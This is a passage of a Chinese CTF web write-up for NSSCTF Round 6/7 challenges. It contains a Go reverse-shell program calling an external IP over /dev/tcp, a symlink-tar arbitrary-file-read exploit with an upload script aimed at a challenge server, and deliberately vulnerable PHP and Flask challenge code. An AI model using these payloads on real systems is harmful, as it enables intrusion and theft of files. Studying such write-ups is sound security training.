class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;os/exec&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">cmd := exec.Command(<span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>,<span class="string">&quot;bash -i &gt;&amp; /dev/tcp/101.42.39.110/666 0&gt;&amp;1&quot;</span>)</span><br><span class="line">out, err := cmd.CombinedOutput()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Printf(<span class="string">&quot;combined out:\n%s\n&quot;</span>, <span class="type">string</span>(out))</span><br><span class="line">log.Fatalf(<span class="string">&quot;cmd.Run() failed with %s\n&quot;</span>, err)</span><br><span class="line">&#125;</span><br><span class="line">fmt.Printf(<span class="string">&quot;combined out:\n%s\n&quot;</span>, <span class="type">string</span>(out))</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>flag一个在根目录一个在/home/galf</p><h2 id="NSSRound-7-Team-0o0"><a href="#NSSRound-7-Team-0o0" class="headerlink" title="[NSSRound#7 Team]0o0"></a>[NSSRound#7 Team]0o0</h2><p>考点</p><p><img src="../images/image-20230328192745454.png" alt="image-20230328192745454"></p><p>题目</p><p><img src="../images/image-20230328192754980.png" alt="image-20230328192754980"></p><p>扫一下目录发现了一个泄露</p><p>下载后发现</p><p><img src="../images/image-20230328192940974.png" alt="image-20230328192940974"></p><p>存在一个php代码，访问之后拿到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$NSSCTF</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;NSSCTF&#x27;</span>] ?: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$NsSCTF</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;NsSCTF&#x27;</span>] ?: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$NsScTF</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;NsScTF&#x27;</span>] ?: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$NsScTf</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;NsScTf&#x27;</span>] ?: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$NSScTf</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;NSScTf&#x27;</span>] ?: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$nSScTF</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;nSScTF&#x27;</span>] ?: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$nSscTF</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;nSscTF&#x27;</span>] ?: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$NSSCTF</span> != <span class="variable">$NsSCTF</span> &amp;&amp; <span class="title function_ invoke__">sha1</span>(<span class="variable">$NSSCTF</span>) === <span class="title function_ invoke__">sha1</span>(<span class="variable">$NsSCTF</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$NsScTF</span>) &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="variable">$NsScTF</span>, <span class="keyword">array</span>(<span class="number">1</span>))) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$NsScTf</span>) === <span class="string">&quot;Welcome to Round7!!!&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;nss_ctfer.vip&#x27;</span>])) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$NSScTf</span> != <span class="number">114514</span> &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$NSScTf</span>, <span class="number">0</span>) === <span class="number">114514</span>) &#123;</span><br><span class="line">                    <span class="variable">$nss</span> = <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$nSScTF</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$nSscTF</span>) !== <span class="string">&quot;NSSRound7&quot;</span>;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="variable">$nss</span> &amp;&amp; <span class="variable">$nSscTF</span> === <span class="string">&quot;NSSRound7&quot;</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">                            <span class="variable">$file_name</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">                            <span class="variable">$path</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">                            <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$file_name</span>, <span class="string">&quot;.png&quot;</span>) == <span class="literal">false</span>)&#123;</span><br><span class="line">                                <span class="keyword">die</span>(<span class="string">&quot;NoO0P00oO0! Png! pNg! pnG!&quot;</span>);</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$path</span>);</span><br><span class="line">                            <span class="variable">$real_content</span> = <span class="string">&#x27;&lt;?php die(&quot;Round7 do you like&quot;);&#x27;</span>. <span class="variable">$content</span> . <span class="string">&#x27;?&gt;&#x27;</span>;</span><br><span class="line">                            <span class="variable">$real_name</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$file_name</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">                            <span class="title function_ invoke__">fwrite</span>(<span class="variable">$real_name</span>, <span class="variable">$real_content</span>);</span><br><span class="line">                            <span class="title function_ invoke__">fclose</span>(<span class="variable">$real_name</span>);</span><br><span class="line">                            <span class="keyword">echo</span> <span class="string">&quot;OoO0o0hhh.&quot;</span>;</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="keyword">die</span>(<span class="string">&quot;NoO0oO0oO0!&quot;</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">&quot;N0o0o0oO0o!&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&quot;NoOo00O0o0!&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;Noo0oO0oOo!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;NO0o0oO0oO!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;No0o0o000O!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;NO0o0o0o0o!&quot;</span>);</span><br><span class="line">&#125; NO0o0o0o0o!</span><br></pre></td></tr></table></figure><p>这个看起来比较绕</p><p><a href="https://blog.csdn.net/m0_64815693/article/details/128784449?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522168000275616800180675463%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=168000275616800180675463&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-128784449-null-null.142^v76^control_1,201^v4^add_ask,239^v2^insert_chatgpt&amp;utm_term=%5BNSSRound%237%20Team%5D0o0&amp;spm=1018.2226.3001.4187">这篇文章写的很详细了</a></p><p>只不过里面有个点写错了，就是绕过<code>if ($NSScTf != 114514 &amp;&amp; intval($NSScTf, 0) === 114514)</code>这个的时候</p><p><img src="../images/image-20230328195154093.png" alt="image-20230328195154093"></p><p>应该要这样绕过</p><p><a href="https://dqgom7v7dl.feishu.cn/docx/RL8cdsipLoYAMvxl8bJcIERznWH">探姬写的关于死亡die绕过的，还有一些关于文件包含的filter</a></p><p>就是很有学习价值</p><h2 id="NSSRound-7-Team-ShadowFlag"><a href="#NSSRound-7-Team-ShadowFlag" class="headerlink" title="[NSSRound#7 Team]ShadowFlag"></a>[NSSRound#7 Team]ShadowFlag</h2><p>考点</p><p><img src="../images/image-20230328195559824.png" alt="image-20230328195559824"></p><p><a href="https://www.bilibili.com/video/BV1jY411S71X/?vd_source=bacfffe46b930fda5761b63367eb298c">wp视频地址</a></p><p>题目</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">flag1 = <span class="built_in">open</span>(<span class="string">&quot;/tmp/flag1.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/tmp/flag2.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    flag2 = f.read()</span><br><span class="line">tag = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;app.py&quot;</span>, <span class="string">&quot;r+&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/shell&quot;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shell</span>():</span><br><span class="line">    <span class="keyword">global</span> tag</span><br><span class="line">    <span class="keyword">if</span> tag != <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">global</span> flag1</span><br><span class="line">        <span class="keyword">del</span> flag1</span><br><span class="line">        tag = <span class="literal">True</span></span><br><span class="line">    os.system(<span class="string">&quot;rm -f /tmp/flag1.txt /tmp/flag2.txt&quot;</span>)</span><br><span class="line">    action = request.form[<span class="string">&quot;act&quot;</span>]</span><br><span class="line">    <span class="keyword">if</span> action.find(<span class="string">&quot; &quot;</span>) != -<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Nonono&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        os.system(action)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Wow&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">404</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">error_date</span>(<span class="params">error</span>):</span><br><span class="line">    sleep(<span class="number">5</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;扫扫扫，扫啥东方明珠呢[怒]&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这道题可以学到很多</p><p><a href="https://dqgom7v7dl.feishu.cn/docx/RL8cdsipLoYAMvxl8bJcIERznWH">反弹shell大合集</a></p><p><a href="https://blog.csdn.net/qq_63169208/article/details/129267023?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522168000642516800186549329%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=168000642516800186549329&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-3-129267023-null-null.142^v76^control_1,201^v4^add_ask,239^v2^insert_chatgpt&amp;utm_term=ShadowFlag&amp;spm=1018.2226.3001.4187">wp文章</a></p><p>这里的话就是利用下面的os.system进行反弹shell，因为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flag1 = <span class="built_in">open</span>(<span class="string">&quot;/tmp/flag1.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/tmp/flag2.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br></pre></td></tr></table></figure><p>有with的话是打开文件后会关闭，没有with的是不会关闭</p><p>所以说flag1就会一直存在在后台进程里面，不会被结束</p><p>删除了没事，在后台进程还是能看到</p><p>这就是全部了</p><p><a href="https://github.com/Randark-JMT/NSSCTF-Round_v7-ShadowFlag">题目的github地址</a></p><h2 id="NSSRound-6-Team-check-V1"><a href="#NSSRound-6-Team-check-V1" class="headerlink" title="[NSSRound#6 Team]check(V1)"></a>[NSSRound#6 Team]check(V1)</h2><p>考点</p><p><img src="../images/image-20230328210025627.png" alt="image-20230328210025627"></p><p>题目</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request</span><br><span class="line"><span class="keyword">import</span> tarfile</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>] = <span class="string">&#x27;./uploads&#x27;</span></span><br><span class="line">app.config[<span class="string">&#x27;MAX_CONTENT_LENGTH&#x27;</span>] = <span class="number">100</span> * <span class="number">1024</span></span><br><span class="line">ALLOWED_EXTENSIONS = <span class="built_in">set</span>([<span class="string">&#x27;tar&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">allowed_file</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">and</span> \</span><br><span class="line">        filename.rsplit(<span class="string">&#x27;.&#x27;</span>, <span class="number">1</span>)[<span class="number">1</span>].lower() <span class="keyword">in</span> ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(__file__, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> file.filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(file.filename)</span><br><span class="line">    <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename) <span class="keyword">and</span> <span class="string">&#x27;..&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> file.filename <span class="keyword">and</span> <span class="string">&#x27;/&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> file.filename:</span><br><span class="line">        file_save_path = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], file.filename)</span><br><span class="line">        <span class="keyword">if</span>(os.path.exists(file_save_path)):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;This file already exists&#x27;</span></span><br><span class="line">        file.save(file_save_path)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;This file is not a tarfile&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        tar = tarfile.<span class="built_in">open</span>(file_save_path, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">        tar.extractall(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>])</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(e)</span><br><span class="line">    os.remove(file_save_path)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;success&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/download&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download_file</span>():</span><br><span class="line">    filename = request.form.get(<span class="string">&#x27;filename&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> filename <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line">    filepath = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;..&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">or</span> <span class="string">&#x27;/&#x27;</span> <span class="keyword">in</span> filename:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(filepath) <span class="keyword">or</span> <span class="keyword">not</span> os.path.isfile(filepath):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filepath, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/clean&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clean_file</span>():</span><br><span class="line">    os.system(<span class="string">&#x27;/tmp/clean.sh&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;success&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">True</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>漏洞点在于  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tar = tarfile.<span class="built_in">open</span>(file_save_path, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">tar.extractall(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>])</span><br></pre></td></tr></table></figure><p><strong>思路</strong></p><p>生成一个<a href="https://so.csdn.net/so/search?q=软链接&amp;spm=1001.2101.3001.7020">软链接</a>，通过<code>软链接</code>链接到<code>/flag文件</code>，然后将软链接打包成tar文件上传，之后再读取文件，读取文件时，由于<code>extractall</code>提取出来的是一个软链接，后面读取的时候就是/flag文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -s /flag flag</span><br><span class="line">tar -cvf flag.tar flag</span><br></pre></td></tr></table></figure><p><strong>软链接可以实现任意文件的读取</strong></p><p>这里就是先通过</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tar = tarfile.open(file_save_path, &quot;r&quot;)</span><br><span class="line">tar.extractall(app.config[&#x27;UPLOAD_FOLDER&#x27;])</span><br></pre></td></tr></table></figure><p>解压压缩包，然后extractall提取的是一个软链接，后面跟着的是提取出来的flag</p><p>然后在访问download，就是实现读取代码，读取到解压后名字为flag的文件</p><p>flag.tar    解压后——&gt;    flag</p><p><strong>所以payload脚本</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://43.142.108.3:28089/&quot;</span></span><br><span class="line">filename = <span class="string">r&quot;./flag.tar&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>(<span class="params">url ,fileName</span>):</span><br><span class="line">    url = url + <span class="string">&quot;upload&quot;</span></span><br><span class="line">    file = &#123;<span class="string">&quot;file&quot;</span>:<span class="built_in">open</span>(fileName,<span class="string">&#x27;rb&#x27;</span>)&#125; <span class="comment">#这里是上传文件</span></span><br><span class="line">    response = req.post(url=url, files = file)</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>(<span class="params">url</span>):</span><br><span class="line">    url = url+<span class="string">&quot;download&quot;</span></span><br><span class="line">    file = &#123;<span class="string">&quot;filename&quot;</span>:<span class="string">&quot;flag&quot;</span>&#125; <span class="comment">#这里是post数据</span></span><br><span class="line">    response = req.post(url, data=file)</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    upload(url,filename)</span><br><span class="line">    download(url)</span><br></pre></td></tr></table></figure><p>tar包在自己的kali上生成</p><h2 id="NSSRound-6-Team-check-V2"><a href="#NSSRound-6-Team-check-V2" class="headerlink" title="[NSSRound#6 Team]check(V2)"></a>[NSSRound#6 Team]check(V2)</h2><p>考点</p><p><img src="../images/image-20230329111310192.png" alt="image-20230329111310192"></p><p>上一题的升级版</p><p>题目</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request</span><br><span class="line"><span class="keyword">import</span> tarfile</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>] = <span class="string">&#x27;./uploads&#x27;</span></span><br><span class="line">app.config[<span class="string">&#x27;MAX_CONTENT_LENGTH&#x27;</span>] = <span class="number">100</span> * <span 